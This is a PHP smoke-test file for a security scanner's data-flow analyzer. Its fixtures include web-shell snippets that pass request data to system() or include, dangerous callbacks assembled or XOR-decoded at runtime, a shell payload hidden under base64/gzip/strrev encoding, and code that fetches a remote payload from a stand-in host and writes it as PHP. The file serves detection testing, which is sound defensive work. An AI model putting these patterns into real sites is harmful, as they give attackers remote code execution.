<?php
/**
 * Standalone smoke tests for the semantic PHP analyzer.
 *
 * Run with:
 * php tests/data-flow-smoke.php
 */

require dirname( __DIR__ ) . '/src/PhpDataFlowAnalyzer.php';

$tests = [
	[
		'name' => 'request data to command execution',
		'code' => <<<'CODE'
<?php
$command = $_POST['command'];
system( $command );
CODE,
		'expect' => 'dataflow_command_taint',
	],
	[
		'name' => 'constructed dangerous function name',
		'code' => <<<'CODE'
<?php
$runner = 'sys' . 'tem';
$command = $_REQUEST['command'];
$runner( $command );
CODE,
		'expect' => 'dataflow_command_taint',
	],
	[
		'name' => 'request-controlled array callable',
		'code' => <<<'CODE'
<?php
$input = $_COOKIE;
$input[4]( $input[8] );
CODE,
		'expect' => 'dataflow_tainted_dynamic_callback',
	],
	[
		'name' => 'indirect callback to file writer',
		'code' => <<<'CODE'
<?php
$callback = 'file_' . 'put_contents';
$payload = $_REQUEST['payload'];
array_diff_ukey( [ 'a' => 1 ], [ $payload => 2 ], $callback );
CODE,
		'expect' => 'dataflow_dangerous_callback_sink',
	],
	[
		'name' => 'remote payload written to PHP',
		'code' => <<<'CODE'
<?php
$payload = file_get_contents( 'https://example.invalid/payload' );
$target = ABSPATH . '/cache/worker.php';
file_put_contents( $target, $payload );
CODE,
		'expect' => 'dataflow_remote_php_write',
	],
	[
		'name' => 'nested static decoding',
		'code_factory' => function () {
			$payload = "<?php system(\$_POST['cmd']); ?>";
			$encoded = strrev( base64_encode( gzcompress( $payload ) ) );
			return "<?php \$payload = gzuncompress( base64_decode( strrev( '" . addslashes( $encoded ) . "' ) ) );";
		},
		'expect' => 'decoded_dataflow_command_taint',
	],
	[
		'name' => 'extract request data then command execution',
		'code' => <<<'CODE'
<?php
extract( $_REQUEST );
system( $command );
CODE,
		'expect' => 'dataflow_command_taint',
	],
	[
		'name' => 'request-controlled include',
		'code' => <<<'CODE'
<?php
$template = $_GET['template'];
include $template;
CODE,
		'expect' => 'dataflow_include_taint',
	],

	[
		'name' => 'local function wrapper to command sink',
		'code' => <<<'CODE'
<?php
function security_scan_test_run( $value ) {
	system( $value );
}
security_scan_test_run( $_POST['command'] );
CODE,
		'expect' => 'dataflow_local_function_security_scan_test_run_command',
	],
	[
		'name' => 'local command wrapper called with static value',
		'code' => <<<'CODE'
<?php
function security_scan_test_static_run( $value ) {
	system( $value );
}
security_scan_test_static_run( 'uptime' );
CODE,
		'expect_none' => true,
	],

	[
		'name' => 'custom XOR decoder result used as callback',
		'code' => <<<'CODE'
<?php
function security_scan_test_decode_name( $input, $key ) {
	$data = hex2bin( $input );
	$output = '';
	for ( $i = 0; $i < strlen( $data ); $i++ ) {
		$output .= chr( ord( $data[ $i ] ) ^ ord( $key[ $i % strlen( $key ) ] ) );
	}
	return $output;
}
$callback = security_scan_test_decode_name( '001122', 'key' );
$callback( $_POST['payload'] );
CODE,
		'expect' => 'dataflow_decoded_dynamic_callback',
	],
	[
		'name' => 'legitimate variable-variable assignment',
		'code' => <<<'CODE'
<?php
foreach ( $args as $key => $value ) {
	$$key = $value;
}
CODE,
		'expect_none' => true,
	],
	[
		'name' => 'normal callback variable',
		'code' => <<<'CODE'
<?php
$callback = $args['callback'];
$result = call_user_func( $callback, $value );
CODE,
		'expect_none' => true,
	],
	[
		'name' => 'remote JSON cache',
		'code' => <<<'CODE'
<?php
$data = file_get_contents( 'https://api.example.invalid/data.json' );
file_put_contents( 'cache.json', $data );
CODE,
		'expect_none' => true,
	],
	[
		'name' => 'object method named exec',
		'code' => <<<'CODE'
<?php
$process->exec( $_POST['value'] );
CODE,
		'expect_none' => true,
	],
];

$failures = 0;

foreach ( $tests as $test ) {
	$code = isset( $test['code_factory'] ) ? $test['code_factory']() : $test['code'];
	$analyzer = new Security_Scan_Php_Data_Flow_Analyzer();
	$findings = $analyzer->analyze( $code );
	$rules = array_column( $findings, 'rule' );
	$passed = ! empty( $test['expect_none'] ) ? empty( $findings ) : in_array( $test['expect'], $rules, true );

	if ( $passed ) {
		echo 'PASS  ' . $test['name'] . PHP_EOL;
		continue;
	}

	$failures++;
	echo 'FAIL  ' . $test['name'] . PHP_EOL;
	if ( ! empty( $findings ) ) {
		foreach ( $findings as $finding ) {
			echo '      ' . $finding['rule'] . ' — ' . $finding['description'] . PHP_EOL;
		}
	}
}

if ( $failures > 0 ) {
	echo PHP_EOL . $failures . ' test(s) failed.' . PHP_EOL;
	exit( 1 );
}

echo PHP_EOL . 'All semantic analyzer smoke tests passed.' . PHP_EOL;
